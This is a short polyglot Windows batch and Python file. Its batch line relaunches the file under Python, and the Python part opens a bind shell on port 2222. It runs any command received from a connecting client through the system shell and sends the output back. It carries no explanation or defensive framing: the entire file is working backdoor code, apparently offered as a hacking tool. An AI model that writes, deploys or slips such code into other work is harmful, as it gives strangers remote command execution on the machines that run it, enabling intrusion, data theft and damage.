@setlocal enabledelayedexpansion && python -x "%~f0"  & exit /b
import socket
import subprocess
import os
command = ''
# By: ClickCyber From israel 
with socket.socket() as soc:
    soc.bind(('192.168.1.42', 2222))
    soc.listen()
    client, addres = soc.accept()
    while command != 'X':
        command = client.recv(256).decode()
        if command[:2] == 'cd' and len(command) > 2:
            os.chdir(command[3:])
            client.send(os.getcwd().encode())
            continue

        p = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        client.send(p.stdout)

